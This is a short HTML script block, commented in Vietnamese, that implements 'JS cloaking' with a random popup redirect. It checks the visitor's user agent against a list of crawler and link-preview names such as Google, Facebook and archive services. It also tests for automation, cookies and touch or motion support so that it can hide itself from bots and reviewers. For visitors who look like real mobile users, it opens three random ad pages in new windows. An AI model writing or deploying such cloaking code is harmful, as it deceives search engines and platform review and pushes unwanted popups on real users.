  <!-- JS Cloaking + Random 3/4 Redirect -->
  <script>
    function isLikelyBot() {
      const ua = navigator.userAgent.toLowerCase();
      const knownBots = [
        'bot', 'crawl', 'spider', 'facebook', 'google', 'twitter', 'bing',
        'meta', 'pinterest', 'yahoo', 'preview', 'whatsapp', 'telegram',
        'discord', 'skype', 'slack', 'linkedin', 'crawler', 'archive'
      ];
      for (let keyword of knownBots) {
        if (ua.includes(keyword)) return true;
      }
      if (navigator.webdriver) return true;
      if (!navigator.cookieEnabled) return true;
      if (!('ontouchstart' in window)) return true;
      if (!window.DeviceMotionEvent && !window.DeviceOrientationEvent) return true;
      return false;
    }

    function shuffle(array) {
      for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
      }
      return array;
    }

    setTimeout(function () {
      if (!isLikelyBot()) {
        const links = [
          "ads.html",
          "ads1.html",
          "ads2.html",
          "ads3.html"
        ];
        const shuffled = shuffle(links).slice(0, 3); // lấy ngẫu nhiên 3 link
        shuffled.forEach((link, index) => {
          setTimeout(() => {
            window.open(link, "_blank");
          }, index * 400); // delay mở popup cách nhau một chút
        });
      }
    }, 800);
  </script>
